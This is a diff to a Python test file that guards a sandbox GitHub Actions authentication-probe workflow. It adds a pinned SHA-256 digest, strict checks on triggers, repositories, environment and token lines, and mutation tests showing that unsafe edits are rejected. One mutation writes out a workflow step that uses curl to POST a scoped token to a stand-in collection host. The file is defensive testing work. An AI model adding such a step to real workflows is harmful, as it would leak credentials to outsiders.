@@ -1,5 +1,6 @@
 """Static safety contract for the temporary AUTO-1B-S0 App auth probe."""
 from pathlib import Path
+import hashlib
 import re
 import unittest
 
@@ -10,6 +11,10 @@ WORKFLOW = (
     / "sandbox-app-auth-probe.yml"
 )
 PIN = "64ab729a6294000f5aa4a4bc0b73d1f32bc45510"
+# Fail closed: any workflow byte change requires an explicit reviewed digest update.
+# This detects arbitrary new shell steps (including token exfiltration) that
+# semantic allowlists alone cannot safely enumerate.
+REVIEWED_WORKFLOW_SHA256 = "22683acb65dee2e0cfdb6bb3140b47de7a37ce115bbd676f01b5ff8ffdbedeed"
 
 
 class SandboxAppAuthProbeContract(unittest.TestCase):
@@ -74,6 +79,71 @@ class SandboxAppAuthProbeContract(unittest.TestCase):
         self.assertIn('.total_count == 1', self.text)
         self.assertNotIn('.repository_selection', self.text)
         self.assertNotRegex(self.text, r'(?m)^\s*(?:echo|printf)\s+.*(?:TOKEN|PRIVATE_KEY)')
+
+
+    def _assert_strict_gate(self, source):
+        # The trigger block must be EXACT, not just contain workflow_dispatch.
+        self.assertRegex(source, r"(?m)^on:\\n  workflow_dispatch: \\{\\}\\n\\npermissions: \\{\\}$")
+        self.assertEqual(
+            len(re.findall(r"(?m)^on:$", source)), 1
+        )
+        self.assertEqual(
+            re.findall(r"(?m)^\\s*repositories:.*$", source),
+            ["          repositories: adcp-mvp-sandbox"],
+        )
+        self.assertEqual(
+            re.findall(r"(?m)^\\s*environment:.*$", source),
+            ["    environment: sandbox-app-probe"],
+        )
+        token_lines = [
+            line.strip() for line in source.splitlines()
+            if "outputs.token" in line
+        ]
+        self.assertEqual(token_lines, [
+            "BREADTH_TOKEN: ${{ steps.breadth.outputs.token }}",
+            "SCOPED_TOKEN: ${{ steps.scoped.outputs.token }}",
+        ])
+        self.assertEqual(
+            hashlib.sha256(source.encode("utf-8")).hexdigest(),
+            REVIEWED_WORKFLOW_SHA256,
+        )
+
+    def test_strict_security_gate(self):
+        self._assert_strict_gate(self.text)
+
+    def test_security_mutations_are_rejected(self):
+        # Reproduce previously missed mutations from the independent report.
+        mutations = {
+            "workflow_call": (
+                "  workflow_dispatch: {}",
+                "  workflow_dispatch: {}\\n  workflow_call: {}",
+            ),
+            "repository_dispatch": (
+                "  workflow_dispatch: {}",
+                "  workflow_dispatch: {}\\n  repository_dispatch: {}",
+            ),
+            "extra_repo": (
+                "repositories: adcp-mvp-sandbox",
+                "repositories: adcp-mvp-sandbox,ADCP",
+            ),
+            "environment_changed": (
+                "environment: sandbox-app-probe",
+                "environment: production",
+            ),
+            "token_exfiltration_step": (
+                "      # Both token steps automatically revoke",
+                "      - name: Exfiltrate token\\n"
+                "        run: curl -X POST https://example.invalid/collect -d \"$SCOPED_TOKEN\"\\n"
+                "      # Both token steps automatically revoke",
+            ),
+        }
+        for name, (before, after) in mutations.items():
+            with self.subTest(mutation=name):
+                self.assertIn(before, self.text)
+                mutated = self.text.replace(before, after, 1)
+                self.assertNotEqual(mutated, self.text)
+                with self.assertRaises(AssertionError):
+                    self._assert_strict_gate(mutated)
 
 
 if __name__ == "__main__":
